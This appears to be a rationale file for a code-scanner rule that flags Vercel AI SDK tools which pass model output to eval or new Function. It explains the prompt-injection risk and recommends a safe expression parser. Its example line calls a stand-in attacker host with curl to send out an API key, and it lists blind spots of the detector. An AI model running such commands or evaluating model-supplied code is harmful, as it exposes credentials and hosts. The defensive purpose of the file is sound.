---
policy_id: vercel_ai_code_execution
category: vercel_ai
topic: code_execution
rules:
  - id: VAI-002
    severity: high
    confidence: 0.9
    scope: tool
    fix_type: code
references: [LLM06]
---

# Policy Rationale: Vercel AI SDK Code-Execution Safety

**Policy ID:** `vercel_ai_code_execution`  
**File:** `vercel_ai/code_execution.yaml`  
**Rules:** VAI-002  
**Severities:** high  
**Fix types:** code  
**References:** LLM06 (Excessive Agency)

---

## What this policy covers

Vercel AI SDK tools whose `execute()` body evaluates code. **VAI-002** fires on
the `has_code_exec_call` fact, which discovery sets for a tool handler that calls
the bare `eval(...)` global or constructs `new Function(...)`. The match keys on
those two AST shapes only — a `call_expression` whose callee text is exactly
`eval`, and a `new_expression` whose constructor identifier is exactly
`Function` — so a method named `obj.eval(...)` or an identifier that merely
contains "eval" does not fire.

---

## Why dynamic code execution is a distinct concern in Vercel AI tools

A Vercel AI tool is model-callable through the agent's `tools` record, so a string
the model emits as an argument can reach the tool's `execute()` and become
executing JavaScript. `eval` and `new Function` compile that string in the agent's
own Node process — and this is *strictly more dangerous than a shell-out*, because
there is not even a separate process boundary to constrain it. The evaluated code
runs with the full Node runtime in scope: `process.env` for secrets,
`require('child_process')` to spawn commands, `require('fs')` to read or write any
file the process can touch. A single prompt injection that lands in the evaluated
string is arbitrary code execution with no sandbox between the model and the host
(LLM06).

`new Function` deserves a specific note: it always closes over the global scope, so
unlike some interpreted languages there is no partial mitigation — no built-in way
to strip globals from the constructed function. The only reliable defense is not
feeding model output to a code evaluator at all.

---

## Rule-by-rule defense

### VAI-002 — Tool execute() evaluates code (eval / new Function) (Severity: high, Confidence: 0.9, Fix type: code)

**What we detect:** a Vercel AI tool whose `execute()` handler calls the bare
`eval(...)` global or constructs `new Function(...)` (the structural
`has_code_exec_call` fact, exact-callee match).

**Why it is flaggable:** `eval` / `new Function` turn a model-supplied string into
executing JavaScript in the agent process, with no sandbox between the call and the
Node runtime's modules, file handles, and environment.

**Real-world consequence:** a `calculate(expr)` tool implemented as
`return eval(expr)` is driven by an injected instruction into
`require('child_process').execSync('curl attacker/'+process.env.API_KEY)` —
arbitrary command execution and credential theft from one evaluated string.

**Why severity is high and not critical:** there is no in-band sandbox and not
even a partial globals-stripping mitigation, so the gap is not partially mitigable;
it is held at high (matching the Python `eval` siblings) rather than critical
because the engine reserves that tier and the exposure depends on whether the
evaluated string is actually model-influenced. **Fix type — code:** removing
`eval` / `new Function` is an edit to the tool's own source. **Confidence 0.9:**
the exact-callee fact eliminates the two dominant false positives by construction
— a same-named method (`x.eval(...)`) and an unrelated identifier do not match —
so confidence is high; the residual gap is the false negative below.

---

## What this policy does not cover

- `eval` reached through an alias (`const e = eval; e(s)`) or a property access
  (`globalThis.eval`, `window.eval`) — the exact-callee match misses it.
- The `vm` module (`vm.runInNewContext`, `vm.runInThisContext`,
  `new vm.Script(...)`), dynamic `import()` of an attacker-named module, and the
  string form of `setTimeout("...", 0)` — none are in the matched set.
- A code-exec call in a helper in another module — discovery sees the tool
  handler, so a wrapper defined elsewhere escapes the fact.
- Evaluations whose argument is provably a constant literal still fire — the fact
  flags the presence of the primitive, not proof of model-control.
- TypeScript only: a tool defined in plain `.js` may not be analyzed with the same
  fidelity as a typed `.ts`/`.tsx` handler, so a `.js` `execute()` body can be a
  coverage gap.

---

## Recommendations beyond the fix

```typescript
import { tool } from "ai";
import { z } from "zod";
import { Parser } from "expr-eval";          // a constrained expression parser

const safeParser = new Parser();             // evaluates math, runs no code

export const calculate = tool({
  description: "Evaluate a constant arithmetic expression and return the result.",
  inputSchema: z.object({ expr: z.string() }),
  execute: async ({ expr }) => {
    try {
      return { result: safeParser.evaluate(expr) };   // no eval / new Function
    } catch {
      return { error: "not a valid expression" };
    }
  },
});
```

1. Remove `eval` / `new Function` from tool handlers. If the tool must interpret a
   model-provided expression, parse it with a real parser into a constrained AST
   you evaluate yourself.
2. If running code is genuinely the product, hand it to an isolated sandbox (a
   separate process or a hardened runner with no filesystem, network, or
   credentials) gated behind an explicit allow-list — never the in-process
   evaluator.
3. Keep secrets out of `process.env` of any process that hosts an evaluation
   tool, and never run such a tool with ambient cloud credentials.
4. Validate the tool's input with a typed `inputSchema` (see VAI-005) so the
   handler receives a checked shape, not raw `unknown`.
